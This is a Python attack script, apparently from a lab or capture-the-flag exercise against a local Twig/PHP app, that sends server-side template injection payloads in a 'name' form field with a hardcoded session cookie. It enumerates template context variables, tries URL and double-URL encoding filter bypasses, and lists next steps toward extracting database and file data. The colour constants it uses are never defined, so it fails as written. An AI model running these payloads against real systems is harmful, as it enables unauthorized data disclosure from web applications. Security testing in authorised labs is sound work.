import requests
import json
import re
from urllib.parse import quote
import sys

# Base configuration
base_url = "http://127.0.0.1:8080"
target_endpoint = "/index.php"
session_cookie = "adf118a2717e83ee6455ea878ebb507e"

session = requests.Session()
session.cookies.set("PHPSESSID", session_cookie)

print(f"[*] ADVANCED: Deep _context analysis and filter bypass testing")
print(f"[*] Target: {base_url}{target_endpoint}")
print(f"[*] Testing URL encoding bypasses and advanced enumeration...\n")

# Advanced payloads focusing on _context enumeration
advanced_payloads = [
    # Raw _context access
    "{{ _context }}",
    "{{ _context|keys }}",
    "{{ _context|keys|first }}",
    "{{ _context|keys|last }}",
    
    # Loop through _context keys to discover variables
    "{% for key in _context|keys %}{{ key }},{% endfor %}",
    "{% for key, value in _context %}{{ key }}={{ value }},{% endfor %}",
    "{% for key in _context|keys %}{{ key }}:{{ _context[key] }},{% endfor %}",
    
    # Check for article data in different forms
    "{{ _context.articles }}",
    "{{ _context['articles'] }}",
    "{{ _context.article }}",
    "{{ _context['article'] }}",
    "{{ _context['items'] }}",
    "{{ _context.items }}",
    "{{ _context.data }}",
    "{{ _context['data'] }}",
    
    # Try numeric access
    "{{ _context[0] }}",
    "{{ _context[1] }}",
    "{{ _context|first }}",
    "{{ _context|last }}",
    
    # Check for other common data variables
    "{{ entries }}",
    "{{ posts }}",
    "{{ blog }}",
    "{{ content }}",
    "{{ records }}",
    "{{ results }}",
    "{{ result }}",
    "{{ data }}",
    "{{ items }}",
    "{{ rows }}",
    "{{ row }}",
]

# URL encoding bypass payloads
encoding_bypasses = [
    # URL encode {{ }}
    quote("{{ _context|keys }}", safe=''),
    quote("{% for key in _context|keys %}{{ key }},{% endfor %}", safe=''),
    
    # Double URL encode
    quote(quote("{{ _context }}"), safe=''),
    quote(quote("{% for key in _context|keys %}{{ key }},{% endfor %}"), safe=''),
    
    # URL encode individual chars
    "%7B%7B%20_context%7Ckeys%20%7D%7D",
    "%7B%25%20for%20key%20in%20_context%7Ckeys%20%25%7D%7B%7B%20key%20%7D%7D%2C%7B%25%20endfor%20%25%7D",
]

# Combined test payloads
all_tests = [
    ("Raw Context Access", advanced_payloads),
    ("Encoding Bypasses", encoding_bypasses),
]

# Results tracking
critical_findings = []
interesting_responses = []

for category_name, payloads in all_tests:
    print(f"\n[*] {category_name}")
    print("=" * 60)
    
    for i, payload in enumerate(payloads, 1):
        try:
            print(f"\nTest {i}: {payload[:100]}")
            
            data = {'name': payload}
            response = session.post(f"{base_url}{target_endpoint}", data=data, timeout=10)
            
            response_text = response.text
            status_code = response.status_code
            length = len(response_text)
            
            print(f"  Status: {status_code} | Length: {length}")
            
            # Check for variable names in response
            variable_pattern = re.findall(r'\b([a-zA-Z_][a-zA-Z0-9_]*)\b', response_text)
            potential_vars = [v for v in variable_pattern if len(v) > 2 and v not in ['is', 'in', 'stock', 'and', 'test', 'another', 'one', 'Come', 'back', 'for', 'the', 'are', 'not', 'null', 'array', 'string', 'Warning', 'Fatal', 'error', 'Uncaught', 'Stack', 'trace', 'Twig', 'Error', 'Syntax']]
            
            # Check for data structures
            has_vars = len(potential_vars) > 10
            has_array = 'array' in response_text.lower() or 'Array' in response_text
            has_keys = 'key' in response_text.lower() or 'keys' in response_text
            
            if has_vars or has_array or has_keys or length > 500:
                print(f"  {GREEN}[+] INTERESTING!{RESET}")
                if has_vars:
                    print(f"    Variables detected: {potential_vars[:10]}")
                if has_array:
                    print(f"    Array data found!")
                
                # Show preview
                preview = response_text[:300].replace('\n', ' ')
                print(f"    Preview: {preview}")
                
                interesting_responses.append({
                    'payload': payload,
                    'status': status_code,
                    'length': length,
                    'response': response_text
                })
            else:
                print(f"  [-] Standard response")
                
        except Exception as e:
            print(f"  {RED}[!] Error: {str(e)[:80]}{RESET}")

print(f"\n{YELLOW}{'='*60}{RESET}")
print(f"\n{GREEN}[*] CRITICAL FINDINGS ANALYSIS:{RESET}")

if interesting_responses:
    print(f"\nFound {len(interesting_responses)} interesting responses:\n")
    
    for idx, resp in enumerate(interesting_responses, 1):
        print(f"\n{GREEN}{idx}. PAYLOAD:{RESET}")
        print(f"   {resp['payload']}")
        print(f"   {GREEN}Response Length: {resp['length']}{RESET}")
        
        # Search for variable patterns
        var_matches = re.findall(r'([a-zA-Z_][a-zA-Z0-9_]*)\s*[:=]\s*', resp['response'])
        if var_matches:
            unique_vars = list(set(var_matches))[:15]
            print(f"   Variable indicators: {unique_vars}")
        
        # Check for specific data patterns
        patterns = {
            'ARRAY': 'array' in resp['response'].lower(),
            'NULL': 'null' in resp['response'].lower(),
            'KEYS': 'key' in resp['response'].lower(),
            'JSON': '{' in resp['response'] and '}' in resp['response'],
            'EQUALS': '=' in resp['response']
        }
        
        found_patterns = [k for k, v in patterns.items() if v]
        if found_patterns:
            print(f"   Patterns: {', '.join(found_patterns)}")
        
        # Show detailed preview for long responses
        if resp['length'] > 1000:
            print(f"   Detailed preview:")
            lines = resp['response'].split('\n')
            for line in lines[:5]:
                if line.strip() and 'is in stock' not in line:
                    print(f"     {line[:100]}")
else:
    print("No highly interesting responses yet - need to dig deeper or try different context variables.")

# Search for actual data based on error messages
print(f"\n{YELLOW}[*] TESTING: More aggressive variable discovery{RESET}")
print("=" * 60)

# Test variables that might contain data
aggressive_tests = [
    # Try accessing raw PHP arrays
    "{{ _context._parent }}",
    "{{ _context._seq }}",
    "{{ _context.loop }}",
    "{{ _context.articles }}",
    "{{ _context.data }}",
    
    # Try numeric context access
    "{{ _context[0] }}",
    "{{ _context[1] }}",
    "{{ _context[2] }}",
    
    # Try to trigger array display
    "{{ _context|length }}",
    "{{ _context|count }}",
    
    # Try alternative iteration
    "{{ _context|join(',') }}",
    "{{ _context|raw }}",
    
    # Try nested access
    "{% for k,v in _context %}{{ k }}:{{ v|length }},{% endfor %}",
]

for i, payload in enumerate(aggressive_tests, 1):
    try:
        print(f"\nTest {i}: {payload}")
        
        data = {'name': payload}
        response = session.post(f"{base_url}{target_endpoint}", data=data, timeout=5)
        
        length = len(response.text)
        print(f"  Length: {length}")
        
        if length > 400:
            preview = response.text[:250].replace('\n', ' ')
            print(f"  {GREEN}[+] Long response! Preview: {preview}{RESET}")
        else:
            print(f"  [-] Standard: {response.text[:100]}")
            
    except Exception as e:
        print(f"  {RED}[!] Error: {str(e)}{RESET}")

print(f"\n{YELLOW}[*] ANALYSIS COMPLETE!{RESET}")
print("\nNext steps:")
print("1. Focus on _context variable - it contains data")
print("2. Try to extract individual elements from _context")
print("3. Check for other data sources (database, files)")
print("4. Try filter bypass techniques if needed")
